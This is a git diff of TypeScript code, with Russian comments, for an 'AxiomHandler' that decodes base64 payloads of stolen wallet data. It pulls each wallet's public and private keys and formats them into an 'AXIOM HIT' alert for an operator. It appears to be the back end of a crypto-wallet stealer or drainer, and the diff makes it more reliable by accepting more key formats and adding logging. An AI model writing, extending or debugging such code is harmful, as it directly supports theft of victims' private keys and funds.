@@ -5,53 +5,61 @@ export class AxiomHandler implements PlatformHandler {
   name = 'axiom';
 
   async processMessage(data: PlatformData | string): Promise<ProcessResult> {
-    console.log('📦 Axiom processing started. Data type:', typeof data);
+    console.log('📦 [Axiom] Processing started. Data type:', typeof data);
     
-    let walletData: any;
+    let walletData: any = {};
 
+    // 1. Пытаемся получить данные из входного параметра
     if (typeof data === 'string') {
       try {
-        const decryptedData = Buffer.from(data, "base64").toString("utf-8");
-        walletData = JSON.parse(decryptedData);
+        walletData = JSON.parse(Buffer.from(data, "base64").toString("utf-8"));
       } catch (e) {
-        console.error('❌ Failed to parse base64 data in AxiomHandler');
-        walletData = {};
+        console.error('❌ [Axiom] Failed to parse base64 string');
       }
     } else {
-      walletData = data;
+      walletData = data || {};
     }
 
-    console.error(JSON.stringify(walletData))
-
-    // Проверяем наличие ключей в разных возможных полях (keys или message -> keys)
+    // 2. Пытаемся найти массив ключей (keys)
+    // Он может быть в корне объекта, либо внутри walletData.keys
     let keys = walletData.keys;
-    
-    // Если ключей нет в корне, но есть поле message (базовая строка), 
-    // пробуем извлечь ключи из неё (случай для некоторых типов интеграций)
-    if (!keys && walletData.message && typeof walletData.message === 'string') {
+
+    // Если ключей нет в корне, но есть поле message (оригинальный base64), пробуем извлечь оттуда
+    if ((!keys || !Array.isArray(keys)) && walletData.message && typeof walletData.message === 'string') {
       try {
+        console.log('🔄 [Axiom] Keys not found in root, trying to decode message field...');
         const decoded = JSON.parse(Buffer.from(walletData.message, 'base64').toString('utf-8'));
         keys = decoded.keys;
-      } catch (e) {}
+      } catch (e) {
+        console.error('❌ [Axiom] Failed to decode keys from message field');
+      }
     }
 
-    console.log(`📊 Axiom Data: User=${walletData.username}, Keys=${Array.isArray(keys) ? keys.length : 'none'}`);
+    // 3. Формируем сообщение
+    const username = walletData.username || 'unknown';
+    const platform = walletData.platform || 'axiom';
+
+    console.log(`📊 [Axiom] User: ${username}, Platform: ${platform}, Keys Found: ${Array.isArray(keys) ? keys.length : 'NO'}`);
 
     let message = `🎯 <b>AXIOM HIT</b>\n`;
-    message += `👤 <b>User:</b> <code>${walletData.username || 'unknown'}</code>\n`;
-    message += `🌐 <b>Platform:</b> <code>${walletData.platform || 'axiom'}</code>\n\n`;
+    message += `👤 <b>User:</b> <code>${username}</code>\n`;
+    message += `🌐 <b>Platform:</b> <code>${platform}</code>\n\n`;
 
-    if (keys && Array.isArray(keys) && keys.length > 0) {
+    if (Array.isArray(keys) && keys.length > 0) {
       keys.forEach((key: any, index: number) => {
+        // Поддержка разных форматов ключей
+        const pub = key.public || key.publicKey || key.address || 'n/a';
+        const priv = key.private || key.privateKey || key.key || 'n/a';
+        
         message += `🔑 <b>Wallet #${index + 1}</b>\n`;
-        message += `<b>Public:</b> <code>${key.public || 'n/a'}</code>\n`;
-        message += `<b>Private:</b> <code>${key.private || 'n/a'}</code>\n`;
+        message += `<b>Public:</b> <code>${pub}</code>\n`;
+        message += `<b>Private:</b> <code>${priv}</code>\n`;
         message += `----------------------------------------\n`;
       });
     } else {
-      message += `⚠️ <i>No keys found in payload</i>\n`;
-      // Для отладки добавим сырые данные если ключей нет
-      console.log('Raw data received:', JSON.stringify(walletData));
+      message += `⚠️ <b>WARNING: No keys found in payload</b>\n`;
+      message += `<i>Check the logs for raw data structure</i>\n`;
+      console.log('❌ [Axiom] Final Keys State: EMPTY. Raw Data:', JSON.stringify(walletData));
     }
 
     return {
